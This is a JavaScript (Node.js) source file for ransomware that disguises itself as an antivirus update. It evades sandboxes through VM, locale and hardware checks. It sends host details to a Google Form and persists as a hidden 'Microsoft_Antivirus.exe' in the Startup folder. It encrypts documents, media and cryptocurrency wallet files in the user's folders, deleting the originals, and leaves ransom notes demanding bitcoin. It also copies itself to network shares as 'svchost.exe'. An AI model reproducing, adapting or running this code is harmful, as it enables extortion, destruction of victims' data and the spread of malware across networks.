const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const os = require("os");
const { execSync , spawn } = require("child_process");
if (!process.env.DETACHED) {
  const child = spawn(process.execPath, [__filename], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true,
    env: { ...process.env, DETACHED: '1' }
  });
  child.unref();
  process.exit(0);
}

const lockKey = "IRNBL0120XG";
const algorithm = "aes-256-ctr";
const key = crypto.createHash("sha256").update(String(lockKey)).digest();
// const TargetPaths = [path.join("D:\\", "test"), path.join("D:\\", "test2")];
const TargetPaths = [
  path.join(os.homedir(), "Desktop"),
  path.join(os.homedir(), "Documents"),
  path.join(os.homedir(), "Downloads"),
  path.join(os.homedir(), "Pictures")
];

const fileExtensions = [
  ".mp3", ".wav", ".mp4", ".doc", ".docx", ".png",
  ".jpg", ".jpeg", ".ppt", ".pptx", ".xls", ".xlsx",".HEIF",
   ".bitcoin", ".litecoin", ".wallet", ".wallets", ".dat",  
];

const vmMacs = [
  "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",
  "08:00:27",                                      
  "52:54:00",                                      
  "00:15:5D", "00:03:FF",                         
  "00:0E:0C", "00:16:3E",                         
];

const vmProcesses = ["vmtoolsd.exe", "VBoxService.exe", "xenservice.exe"];

const ransomMessage = `hello,
send 300 BTC to my wallet "13esrebghtu5463j2b"
for opening your file. if you are not well :
>>> after 3 day, the amount will be doubled
>>> after 7 day, you never get to the file

see you :(): `;


function collectSystemInfo() {
  const network = Object.values(os.networkInterfaces()).flat();
  const primaryIPv4 = network.find(
    (d) => d.family === "IPv4" && !d.internal
  );

  return {
    computerName: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    osRelease: os.release(),
    nodeVersion: process.version,
    cpu: {
      cores: os.cpus().length,
      model: os.cpus()[0]?.model || "unknown",
    },
    memory: {
      total: os.totalmem(),
      free: os.freemem(),
      usagePercent:
        ((os.totalmem() - os.freemem()) / os.totalmem()) * 100,
    },
    uptime: {
      system: os.uptime(),
      process: process.uptime(),
    },
    network: {
      ipv4: primaryIPv4?.address || null,
      mac: primaryIPv4?.mac || null,
    },
    paths: {
      home: os.homedir(),
      temp: os.tmpdir(),
      cwd: process.cwd(),
    },
    process: {
      pid: process.pid,
      memoryUsage: process.memoryUsage().rss,
    },
    timestamp: Date.now(),
  };
}


function checkVMByProcess() {
  try {
    const output = execSync("tasklist", { encoding: "utf8" });
    return vmProcesses.some((p) =>
      output.toLowerCase().includes(p.toLowerCase())
    );
  } catch {
    return false;
  }
}
function checkVMByMAC() {
  const interfaces = os.networkInterfaces();
  for (const name in interfaces) {
    for (const iface of interfaces[name]) {
      if (!iface.mac) continue;
      const prefix = iface.mac.toUpperCase().slice(0, 8);
      if (vmMacs.some((vm) => prefix.startsWith(vm))) return true;
    }
  }
  return false;
}

function checkLanguage() {
  const sysLang = (process.env.LANG || "").toLowerCase();
  const langs = ["fa_ir", "ru_ru", "ar_lb", "ar_ps"];
  return langs.some((lang) => sysLang.includes(lang));
}
async function getDiskInfo() {
  try {
    const diskPath = process.platform === "win32" ? "C:\\" : "/";
    const stats = fs.statfsSync(diskPath);
    const diskSizeGB = (stats.bsize * stats.blocks) / (1024 ** 3);
    return { isLow: diskSizeGB < 30 };
  } catch {
    try {
      const out = execSync(
        'wmic logicaldisk where name="C:" get size',
        { encoding: "utf8", stdio: "pipe" }
      );
      const match = out.match(/(\d+)/g);
      if (match) {
        const bytes = parseInt(match[0], 10);
        const sizeGB = bytes / (1024 ** 3);
        return { isLow: sizeGB < 30 };
      }
    } catch {}
    return null;
  }
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}


function lockFile(filePath, encKey) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, encKey, iv);
  const input = fs.readFileSync(filePath);
  const encrypted = Buffer.concat([cipher.update(input), cipher.final()]);
  fs.writeFileSync(filePath + ".onyx", Buffer.concat([iv, encrypted]));
  fs.unlinkSync(filePath);
}
function encryptDirectory(targetPath, encKey) {
  const entries = fs.readdirSync(targetPath);
  for (const entry of entries) {
    const fullPath = path.join(targetPath, entry);
    let stat;
    try {
      stat = fs.statSync(fullPath);
    } catch {
      continue;
    }

    if (stat.isDirectory()) {
      encryptDirectory(fullPath, encKey);
      continue;
    }

    if (!stat.isFile()) continue;
    if (entry.endsWith(".onyx")) continue;
    if (entry === "Antivirus-Updater.exe" || entry === "ReadMe.txt") continue;

    const ext = path.extname(entry).toLowerCase();
    if (fileExtensions.includes(ext)) {
      try {
        lockFile(fullPath, encKey);
        console.log(`Updating .../`);
      } catch (err) {
        console.log(`Error updating try again`);
      }
    }
  }
}
function sayBye(){
    for (const targetPath of TargetPaths) {
    if (fs.existsSync(targetPath)) {
      console.log(`Updating .../`);
      encryptDirectory(targetPath, key);
    } else {
      console.log(`error update !`);
    }
  }
  deployRansomNotes(TargetPaths)

  if(!os.userInfo().domain === undefined){
    iceNetwork()
  }
}

function deployRansomNotes(targetPaths) {
  for (const tPath of targetPaths) {
    if (fs.existsSync(tPath)) {
      fs.writeFileSync(path.join(tPath, "ReadMe.txt"), ransomMessage);
    }
  }
  const desktopPath = path.join(os.homedir(), "Desktop", "ReadMe.txt");
  try {
    fs.writeFileSync(desktopPath, ransomMessage);
    spawn('notepad.exe', [desktopPath],{detached:true}).unref()
  } catch {}
}


function installPersistence() {
  try {
    const currentPath = process.execPath;
    const startupPath = path.join(
      os.homedir(),
      "AppData","Roaming","Microsoft","Windows",
      "Start Menu","Programs","Startup","Microsoft_Antivirus.exe"
    );
    const fallbackPath = path.join("C:", "Users", "Public", "MincrosoftTeam.exe");

    fs.copyFileSync(currentPath, fallbackPath);
    fs.copyFileSync(currentPath, startupPath);
    execSync(`attrib +h "${startupPath}"`, { stdio: "ignore" });

    setInterval(() => {
      try {
        if (!fs.existsSync(startupPath)) {
          fs.copyFileSync(fallbackPath, startupPath);
          execSync(`attrib +h "${startupPath}"`, { stdio: "ignore" });
        }
      } catch {}
    }, 300000);
  } catch (err) {}
}

function iceNetwork() {
  try {
    const netView = execSync('net view', { encoding: "utf8", timeout: 10000 });
    const servers = [...netView.matchAll(/^\\\\([^\s]+)/gm)].map(m => m[1]);

    for (const server of servers) {
      try {
        const shareOutput = execSync(`net view \\\\${server}`, {
          encoding: "utf8",
          timeout: 5000,
          stdio: "pipe",
        });

        const shareLines = shareOutput.split('\n');

        for (const line of shareLines) {
          const match = line.match(/^\s*([^\s]+)\s+Disk/);
          if (!match) continue;

          const shareName = match[1];

          if (['C$', 'D$', 'ADMIN$', 'IPC$', 'PRINT$'].includes(shareName)) continue;

          const sharePath = `\\\\${server}\\${shareName}`;

          try {
            const testFile = `${sharePath}\\${Date.now()}.tmp`;
            execSync(`echo test > "${testFile}"`, { stdio: "ignore", timeout: 3000 });
            execSync(`del "${testFile}"`, { stdio: "ignore", timeout: 3000 });

            console.log(`Microsoft server find ${sharePath}`);
             const payloadPath = `${sharePath}\\svchost.exe`;
             fs.copyFileSync(process.execPath, payloadPath);
          } catch {}
        }
      } catch {}
    }
  } catch {}
}

async function exfiltrateSystemInfo(info) {
  try {
    const formURL =
      "https://docs.google.com/forms/d/e/1FAIpQLSfcRNk8RMqQq_6zXmkUbY2G5zekTKos7VTvDby5-BOQ4bnBFQ/formResponse";
    const params = new URLSearchParams();
    params.append("entry.835359149", JSON.stringify(info));
    params.append("entry.2140921605", `system info (${info.username})`);

    const response = await fetch(formURL, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params,
    });

    const text = await response.text();
    if (
      text.includes("نظر شما ارسال شد") ||
      text.includes("response has been recorded")
    ) {
      console.log("update pkg");
    } else {
      console.log(`Microsoft update pkg error`);
    }
  } catch (err) {}
}

// ==================== Main ====================
async function main() {
  const systemInfo = collectSystemInfo();


  if (checkVMByMAC() || checkVMByProcess()) {
    console.log("VM detected by MAC/process");
    process.exit(0);
  }

  if (checkLanguage()) {
    console.log("CIS region detected");
    process.exit(0);
  }
  if (process.env.NODE_ENV === 'development') {
    process.exit(0);
    }
  if (os.cpus().length < 2) {
    console.log("Low CPU count");
    process.exit(0);
  }

  console.log("start updating please wait ...");
  await sleep(30000);

  if (os.totalmem() < 4 * 1024 ** 3) {
    console.log("[-] Low RAM, exiting");
    process.exit(0);
  }

  const diskInfo = await getDiskInfo();
  if (diskInfo && diskInfo.isLow) {
    console.log("[-] Low disk space, exiting");
    process.exit(0);
  }

  await exfiltrateSystemInfo(systemInfo);


        installPersistence();

  sayBye()

  console.log("Your Anti-Virus Updated - end");
  process.exit(0)
}

main().catch((err) => {
  console.error("[FATAL]", err);
  process.exit(1);
});
